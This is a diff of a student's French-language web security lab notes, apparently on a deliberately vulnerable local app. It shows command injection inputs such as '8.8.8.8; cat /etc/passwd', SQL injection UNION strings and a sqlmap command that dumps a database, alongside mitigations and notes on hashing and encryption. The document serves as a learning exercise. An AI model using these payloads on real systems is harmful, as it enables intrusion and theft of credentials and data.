@@ -22,6 +22,11 @@ Pour se protéger, on peut limiter le nombre de requete depuis L'IP; Renvoyer co
 ## Question 3
 8.8.8.8; cat /etc/passwd
 chaine après la commande ping, j'affiche le fichier avec le cat 
+; netstats
+Apparemment pas installer sur le serveur, j'ai cherché une alternative
+; nstat
+Qui liste les connexions actives
+
 possibilité d'exécuter des commandes OS, vol d'information, modification du server;
 -validation des inputs: taille, min and max length;
 -on escape les caractères ';'
@@ -35,8 +40,10 @@ Premier test avec ', qui renvoie une erreur sql;
 3eme test avec ' OR 1=1 UNION SELECT 1,1,1 -- , pas le bon nombre de colonnes
 4eme avec ' OR 1=1 UNION SELECT 1,2 -- 
 ' OR 1=1 UNION SELECT CONCAT(information_schema.tables),2 --; unknown table information_schema 
-
-
+Faille: récupération d'information sensible de la base;
+Protection: préparation des requêtes en amont avec ORM;
+on escape les caractères 
+vérification de l'input
 ## Question 6
 
 sqlmap -u "http://localhost/vulnerabilities/sqli_blind/?id=2&Submit=Submit#" --dbms=mysql --dump --cookie="PHPSESSID=nhea6jcj46io50n8b7r4dl1135; security=low" -b --current-db --current-user
@@ -61,4 +68,14 @@ et peut donc se déclencher a tout moment;
 Confidentiality, Integrityn, Availabitlity
 Principe du transport de données
 
+## Question 10
 
+Le hash est un algorithme qui permet de modifier un texte en une valeur fixe. 
+On rajoute un salt pour éviter que le hashage soit facilement retrouvé. 
+Il existe des listes de correspondance entre mots et hash facilement trouvable;
+
+Chiffrer est une méthode d'encodage pour que seul les personnes ayant la clé de chiffrement
+puissent le décoder;
+2 méthodes = symétrique: même clé de chiffrement
+asymétrique: PGP, une clé public pour recevoir des messages chiffrés
+et une clé privée pour les décoder;
